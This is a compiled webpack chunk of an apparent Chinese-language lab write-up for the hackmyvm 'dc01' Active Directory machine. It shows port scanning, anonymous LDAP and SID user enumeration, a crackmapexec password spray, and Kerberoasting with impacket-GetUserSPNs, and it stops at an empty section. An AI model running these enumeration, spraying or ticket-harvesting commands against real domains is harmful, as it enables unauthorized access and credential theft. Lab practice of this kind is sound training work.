"use strict";(self.webpackChunkrookie=self.webpackChunkrookie||[]).push([[933],{2919:(e,n,o)=>{o.r(n),o.d(n,{assets:()=>a,contentTitle:()=>p,default:()=>d,frontMatter:()=>r,metadata:()=>i,toc:()=>c});var t=o(4848),s=o(8453);const r={},p="dc01",i={id:"\u9776\u573a/hackmyvm-dc/dc01",title:"dc01",description:"nmap",source:"@site/docs/\u9776\u573a/hackmyvm-dc/dc01.md",sourceDirName:"\u9776\u573a/hackmyvm-dc",slug:"/\u9776\u573a/hackmyvm-dc/dc01",permalink:"/S0rry/docs/\u9776\u573a/hackmyvm-dc/dc01",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"BC_Sidebar",previous:{title:"hackmyvm-dc",permalink:"/S0rry/docs/category/hackmyvm-dc"}},a={},c=[{value:"nmap",id:"nmap",level:2},{value:"smblient",id:"smblient",level:2},{value:"ldapsearch",id:"ldapsearch",level:2},{value:"imapcket-lookupsid",id:"imapcket-lookupsid",level:2},{value:"sublime\u6b63\u5219",id:"sublime\u6b63\u5219",level:2},{value:"crackmapexec",id:"crackmapexec",level:2},{value:"Kerberoasting",id:"kerberoasting",level:2},{value:"impacket-GetUserSPNs",id:"impacket-getuserspns",level:3},{value:"file_svc",id:"file_svc",level:4}];function l(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"dc01",children:"dc01"}),"\n",(0,t.jsx)(n.h2,{id:"nmap",children:"nmap"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'\u250c\u2500\u2500(root\u327fhack)-[/home/hack/Desktop]\n\u2514\u2500# nmap -sT -sC -p- --min-rate="1000" 192.168.56.128\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 23:08 CST\nNmap scan report for 192.168.56.128\nHost is up (0.00041s latency).\nNot shown: 65517 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49668/tcp open  unknown\n49676/tcp open  unknown\n49689/tcp open  unknown\n49709/tcp open  unknown\nMAC Address: 08:00:27:83:7B:79 (Oracle VirtualBox virtual NIC)\n\nHost script results:\n| smb2-time: \n|   date: 2024-07-24T06:10:06\n|_  start_date: N/A\n|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:83:7b:79 (Oracle VirtualBox virtual NIC)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 14h59m15s\n\nNmap done: 1 IP address (1 host up) scanned in 199.85 seconds\n'})}),"\n",(0,t.jsx)(n.h2,{id:"smblient",children:"smblient"}),"\n",(0,t.jsx)(n.p,{children:"\u53d1\u73b0\u51e0\u4e4e\u90fd\u6ca1\u6709\u6743\u9650"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fhack)-[/home/hack/Desktop]\n\u2514\u2500# smbclient  -L 192.168.56.128  \nPassword for [WORKGROUP\\root]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backup          Disk      \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \n        Users           Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 192.168.56.128 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup availabl\n"})}),"\n",(0,t.jsx)(n.h2,{id:"ldapsearch",children:"ldapsearch"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fhack)-[/home/hack/Desktop]\n\u2514\u2500# ldapsearch -x -H ldap://192.168.56.128 -s base\n\n# extended LDIF\n#\n# LDAPv3\n# base <> (default) with scope baseObject\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n#\ndn:\ndomainFunctionality: 7\nforestFunctionality: 7\ndomainControllerFunctionality: 7\nrootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL\nldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL\nisGlobalCatalogReady: TRUE\nsupportedSASLMechanisms: GSSAPI\nsupportedSASLMechanisms: GSS-SPNEGO\nsupportedSASLMechanisms: EXTERNAL\nsupportedSASLMechanisms: DIGEST-MD5\nsupportedLDAPVersion: 3\nsupportedLDAPVersion: 2\nsupportedLDAPPolicies: MaxPoolThreads\nsupportedLDAPPolicies: MaxPercentDirSyncRequests\nsupportedLDAPPolicies: MaxDatagramRecv\nsupportedLDAPPolicies: MaxReceiveBuffer\nsupportedLDAPPolicies: InitRecvTimeout\nsupportedLDAPPolicies: MaxConnections\nsupportedLDAPPolicies: MaxConnIdleTime\nsupportedLDAPPolicies: MaxPageSize\nsupportedLDAPPolicies: MaxBatchReturnMessages\nsupportedLDAPPolicies: MaxQueryDuration\nsupportedLDAPPolicies: MaxDirSyncDuration\nsupportedLDAPPolicies: MaxTempTableSize\nsupportedLDAPPolicies: MaxResultSetSize\nsupportedLDAPPolicies: MinResultSets\nsupportedLDAPPolicies: MaxResultSetsPerConn\nsupportedLDAPPolicies: MaxNotificationPerConn\nsupportedLDAPPolicies: MaxValRange\nsupportedLDAPPolicies: MaxValRangeTransitive\nsupportedLDAPPolicies: ThreadMemoryLimit\nsupportedLDAPPolicies: SystemMemoryLimitPercent\nsupportedControl: 1.2.840.113556.1.4.319\nsupportedControl: 1.2.840.113556.1.4.801\nsupportedControl: 1.2.840.113556.1.4.473\nsupportedControl: 1.2.840.113556.1.4.528\nsupportedControl: 1.2.840.113556.1.4.417\nsupportedControl: 1.2.840.113556.1.4.619\nsupportedControl: 1.2.840.113556.1.4.841\nsupportedControl: 1.2.840.113556.1.4.529\nsupportedControl: 1.2.840.113556.1.4.805\nsupportedControl: 1.2.840.113556.1.4.521\nsupportedControl: 1.2.840.113556.1.4.970\nsupportedControl: 1.2.840.113556.1.4.1338\nsupportedControl: 1.2.840.113556.1.4.474\nsupportedControl: 1.2.840.113556.1.4.1339\nsupportedControl: 1.2.840.113556.1.4.1340\nsupportedControl: 1.2.840.113556.1.4.1413\nsupportedControl: 2.16.840.1.113730.3.4.9\nsupportedControl: 2.16.840.1.113730.3.4.10\nsupportedControl: 1.2.840.113556.1.4.1504\nsupportedControl: 1.2.840.113556.1.4.1852\nsupportedControl: 1.2.840.113556.1.4.802\nsupportedControl: 1.2.840.113556.1.4.1907\nsupportedControl: 1.2.840.113556.1.4.1948\nsupportedControl: 1.2.840.113556.1.4.1974\nsupportedControl: 1.2.840.113556.1.4.1341\nsupportedControl: 1.2.840.113556.1.4.2026\nsupportedControl: 1.2.840.113556.1.4.2064\nsupportedControl: 1.2.840.113556.1.4.2065\nsupportedControl: 1.2.840.113556.1.4.2066\nsupportedControl: 1.2.840.113556.1.4.2090\nsupportedControl: 1.2.840.113556.1.4.2205\nsupportedControl: 1.2.840.113556.1.4.2204\nsupportedControl: 1.2.840.113556.1.4.2206\nsupportedControl: 1.2.840.113556.1.4.2211\nsupportedControl: 1.2.840.113556.1.4.2239\nsupportedControl: 1.2.840.113556.1.4.2255\nsupportedControl: 1.2.840.113556.1.4.2256\nsupportedControl: 1.2.840.113556.1.4.2309\nsupportedControl: 1.2.840.113556.1.4.2330\nsupportedControl: 1.2.840.113556.1.4.2354\nsupportedCapabilities: 1.2.840.113556.1.4.800\nsupportedCapabilities: 1.2.840.113556.1.4.1670\nsupportedCapabilities: 1.2.840.113556.1.4.1791\nsupportedCapabilities: 1.2.840.113556.1.4.1935\nsupportedCapabilities: 1.2.840.113556.1.4.2080\nsupportedCapabilities: 1.2.840.113556.1.4.2237\nsubschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=L\n OCAL\nserverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur\n ation,DC=SOUPEDECODE,DC=LOCAL\nschemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL\nnamingContexts: DC=SOUPEDECODE,DC=LOCAL\nnamingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL\nnamingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL\nnamingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL\nnamingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL\nisSynchronized: TRUE\nhighestCommittedUSN: 57369\ndsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,\n CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL\ndnsHostName: DC01.SOUPEDECODE.LOCAL\ndefaultNamingContext: DC=SOUPEDECODE,DC=LOCAL\ncurrentTime: 20240731160642.0Z\nconfigurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL\n\n# search result\nsearch: 2\nresult: 0 Success\n\n# numResponses: 2\n# numEntries: 1\n"})}),"\n",(0,t.jsx)(n.h2,{id:"imapcket-lookupsid",children:"imapcket-lookupsid"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"impacket-lookupsid soupedecode.local/anonymous@192.168.56.128 >User.txt\n"})}),"\n",(0,t.jsx)(n.h2,{id:"sublime\u6b63\u5219",children:"sublime\u6b63\u5219"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"\\\\.*(?=\\s*\\()\n"})}),"\n",(0,t.jsx)(n.h2,{id:"crackmapexec",children:"crackmapexec"}),"\n",(0,t.jsx)(n.p,{children:"\u53d1\u73b0\u9700\u8981\u66f4\u6539ybob317\u5bc6\u7801"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fhack)-[/home/hack/Desktop]\n\u2514\u2500# crackmapexec smb 192.168.56.128 -u 1.txt -p 1.txt  --no-bruteforce --continue-on-successd\n"})}),"\n",(0,t.jsx)(n.h2,{id:"kerberoasting",children:"Kerberoasting"}),"\n",(0,t.jsx)(n.h3,{id:"impacket-getuserspns",children:"impacket-GetUserSPNs"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fhack)-[/home/hack/Desktop]\n\u2514\u2500# impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:hack123 -dc-ip 192.168.56.128         \nImpacket v0.11.0 - Copyright 2023 Fortra\n\nServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation \n----------------------  --------------  --------  --------------------------  ---------  ----------\nFTP/FileServer          file_svc                  2024-06-18 01:32:23.726085  <never>               \nFW/ProxyServer          firewall_svc              2024-06-18 01:28:32.710125  <never>               \nHTTP/BackupServer       backup_svc                2024-06-18 01:28:49.476511  <never>               \nHTTP/WebServer          web_svc                   2024-06-18 01:29:04.569417  <never>               \nHTTPS/MonitoringServer  monitoring_svc            2024-06-18 01:29:18.511871  <never>\n"})}),"\n",(0,t.jsx)(n.h4,{id:"file_svc",children:"file_svc"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python"})})]})}function d(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},8453:(e,n,o)=>{o.d(n,{R:()=>p,x:()=>i});var t=o(6540);const s={},r=t.createContext(s);function p(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:p(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);